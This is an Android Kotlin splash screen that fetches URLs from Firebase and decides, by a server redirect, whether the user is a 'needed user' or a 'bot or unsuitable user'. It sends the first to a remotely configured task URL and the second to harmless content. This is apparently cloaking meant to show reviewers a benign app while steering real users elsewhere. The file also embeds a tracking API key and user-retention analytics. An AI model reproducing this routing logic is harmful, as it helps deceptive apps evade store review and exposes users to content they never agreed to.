package volts.kershief.chane.ui

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.net.Uri
import android.os.Bundle
import android.util.Log
import android.view.View
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.ProgressBar
import com.android.installreferrer.api.InstallReferrerClient
import com.google.firebase.database.DataSnapshot
import com.google.firebase.analytics.FirebaseAnalytics
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.onesignal.OneSignal
import com.yandex.metrica.YandexMetrica
import com.yandex.metrica.YandexMetricaConfig
import kotlinx.android.synthetic.main.activity_web_v.*
import org.joda.time.DateTime
import org.joda.time.Days
import volts.kershief.chane.*
import volts.kershief.chane._core.BaseActivity


/**
 * Created by Andriy Deputat email(andriy.deputat@gmail.com) on 3/13/19.
 */
class SplashActivity : BaseActivity() {

    private lateinit var webView: WebView
    private lateinit var progressBar: ProgressBar

    private lateinit var dataSnapshot: DataSnapshot

    private lateinit var mRefferClient: InstallReferrerClient
    private lateinit var database: DatabaseReference
    val REFERRER_DATA = "REFERRER_DATA"

    lateinit var prefs: SharedPreferences

    lateinit var firebaseAnalytic: FirebaseAnalytics

    override fun getContentView(): Int = R.layout.activity_web_v

    var urlFromIntent = "not"
    var urlFromIntent2 = "not"
    var urlFromReferClient = "ref not"

    override fun initUI() {
        webView = web_view
        progressBar = progress_bar

        firebaseAnalytic = FirebaseAnalytics.getInstance(this)

        prefs = getSharedPreferences("volts.kershief.chane", Context.MODE_PRIVATE)
        prefs.edit().putString("sessionTime", DateTime.now().toString()).apply()

        checkReturn()

        OneSignal.startInit(this)
            .inFocusDisplaying(OneSignal.OSInFocusDisplayOption.Notification)
            .unsubscribeWhenNotificationsAreDisabled(true)
            .init()

    }


    fun checkReturn() {
        if (prefs.getString("dateInstall", "") != "") {
            if (Days.daysBetween(DateTime(prefs.getString("dateInstall", "")), DateTime.now()).days == 1) {
                if (!prefs.getBoolean("rrToday", false)) {
                    prefs.edit().putString("rr", "RR").apply()
                    val rrOneBundle = Bundle()
                    rrOneBundle.putString("RR", "RR")

                    firebaseAnalytic.logEvent("RR", rrOneBundle)
                    prefs.edit().putBoolean("rrToday", true).apply()
                }
            }
        }
    }


    override fun setUI() {
        logEvent("splash-screen")
        val config = YandexMetricaConfig.newConfigBuilder("55990b28-d83f-41b4-a6c6-da672c4313a7").build()
        // Initializing the AppMetrica SDK.
        YandexMetrica.activate(applicationContext, config)
        // Automatic tracking of user activity.
        YandexMetrica.enableActivityAutoTracking(this.application)
        webView.webViewClient = object : WebViewClient() {
            /**
             * Check if url contains key words:
             * /money - needed user (launch WebVActivity or show in browser)
             * /main - bot or unsuitable user (launch ContentActivity)
             */
            @SuppressLint("deprecated")
            override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
                if (url.contains("/money")) {
                    // task url for web view or browser
                    var taskUrl = dataSnapshot.child(TASK_URL).value as String
                    val value = dataSnapshot.child(SHOW_IN).value as String


                    if (prefs.getBoolean("firstrun", true)) {
                        prefs.edit().putString("dateInstall", DateTime.now().toString()).apply()
                        prefs.edit().putBoolean("firstrun", false).apply()
                    }

                    taskUrl = prefs.getString("endurl", taskUrl).toString()

                    if (value == WEB_VIEW) {
                        startActivity(
                            Intent(this@SplashActivity, WebVActivity::class.java)
                                .putExtra(EXTRA_TASK_URL, taskUrl)
                        )
                        finish()
                    } else if (value == BROWSER) {
                        // launch browser with task url
                        val browserIntent = Intent(
                            Intent.ACTION_VIEW,
                            Uri.parse("")
                        )

                        logEvent("task-url-browser")
                        startActivity(browserIntent)
                        finish()
                    }
                } else if (url.contains("/main")) {
                    val taskUrl = dataSnapshot.child(TASK_URL).value as String
                    startActivity(Intent(this@SplashActivity, MainSamatActivity::class.java)
                        .putExtra(EXTRA_TASK_URL, taskUrl))
                    finish()
                }
                progressBar.visibility = View.GONE
                return false
            }
        }

        progressBar.visibility = View.VISIBLE

        database = FirebaseDatabase.getInstance().reference


        getValuesFromDatabase({
            dataSnapshot = it


            // load needed url to determine if user is suitable
            webView.loadUrl(it.child(SPLASH_URL).value as String)
        }, {
            Log.d("SplashErrActivity", "didn't work fetchremote")
            progressBar.visibility = View.GONE
        })
    }
}